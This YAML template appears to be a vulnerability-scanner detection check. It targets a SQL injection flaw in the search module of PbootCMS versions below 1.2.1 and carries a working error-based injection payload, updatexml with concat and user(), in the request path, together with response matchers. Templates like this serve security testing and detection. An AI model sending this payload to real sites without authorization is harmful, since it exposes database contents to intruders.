# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - XPATH syntax error
          - 执行SQL发生错误
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123'
id: pbootcms-search-sql-injection
info:
  author: daffainfo
  description: PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息。漏洞影响:PbootCMS < 1.2.1  app="PBOOTCMS"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: PbootCMS search SQL注入漏洞
  severity: critical
  tags: pbootcms,pboot,sqli,argus-import
